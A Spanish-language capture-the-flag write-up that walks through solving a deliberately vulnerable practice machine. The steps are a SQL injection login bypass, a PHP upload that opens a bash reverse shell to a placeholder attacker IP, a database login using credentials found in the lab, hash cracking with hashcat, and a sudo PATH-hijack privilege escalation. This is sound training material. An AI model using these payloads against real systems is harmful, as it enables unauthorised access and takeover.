---
layout: /src/layouts/MDLayout.astro
title: Cómo resolver monkey vuln machine
description: Learn how to solve a CTF machine in this post. Discover how to perform a login bypass, decrypt hashes, escalate privileges, and more.
---
**Es importante tener en cuenta que el siguiente post contiene spoilers y revela la solución a una máquina de CTF. Si aún no has resuelto la máquina y quieres hacerlo por ti mismo, te recomendamos que no sigas leyendo. ¡Buena suerte resolviendo la máquina!**

Descarga la máquina [aquí](https://github.com/wanetty/monkey_vuln_machine)

En los eventos de CTF, los participantes tienen como objetivo encontrar vulnerabilidades en sistemas y aplicaciones para obtener acceso no autorizado y, en última instancia, encontrar la "bandera" o la respuesta a un desafío en particular. En este post, veremos cómo resolver una máquina de CTF siguiendo una serie de pasos.

## Bypass de login

En primer lugar, intentaremos acceder a la aplicación utilizando una técnica de "Bypass de login". Para ello, se pueden utilizar las siguientes inyecciones de SQL:


```bash
test ' or 1 = 1 --  test 
' or 'a' = 'a' --
```

Estas inyecciones explotan una vulnerabilidad en el código de la aplicación y permiten acceder sin necesidad de proporcionar las credenciales correctas.

## Subida de ficheros

Una vez dentro de la aplicación, podemos aprovechar una vulnerabilidad de subida de ficheros para subir un archivo que nos permita establecer una conexión de "Reverse Shell". Para ello, podemos utilizar un archivo PHP con el siguiente contenido:

```php
<?php     
	exec("/bin/bash -c 'bash -i >& /dev/tcp/IP_DEL_ATACANTE/PUERTO 0>&1'"); 
?>
```

Debemos sustituir "IP_DEL_ATACANTE" y "PUERTO" con nuestra propia dirección IP y un puerto que esté disponible para la conexión.

## Conexión base de datos

Una vez que hemos conseguido una Reverse Shell, podemos buscar las credenciales de conexión a la base de datos en el código de la aplicación. En este caso, encontramos las credenciales en el archivo `login.php`.

Utilizamos las credenciales para conectarnos a la base de datos mediante el siguiente comando:

```bash
mysql -h mariadb -u Threepwood -pmonkeyisland user_db
```

## Descifrando hashes

Dentro de la base de datos encontramos un archivo de hashes. Para descifrarlos, podemos utilizar la herramienta `hashcat` y una lista de palabras comunes. El comando para descifrar los hashes en el archivo `hashes.txt` utilizando la lista de palabras `rockyou.txt` sería:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlist/rockyou.txt
```

## Escalada de privilegios

Finalmente, para escalar nuestros privilegios, buscamos en el sistema algún comando que podamos ejecutar con permisos de super usuario. En este caso, encontramos un script llamado `find_chest.sh` que se puede ejecutar como super usuario sin necesidad de introducir una contraseña. Además, este script utiliza la variable `cat` de forma relativa, lo que significa que podemos manipular la variable `$PATH` para ejecutar cualquier comando con permisos de super usuario. Para ello, ejecutamos el siguiente comando:
```bash
sudo PATH=$(pwd):$PATH /home/Guybrush/find_chest.sh
```

Con esto, conseguimos ejecutar el comando que queramos con permisos de super usuario, lo que nos permite completar el desafío.



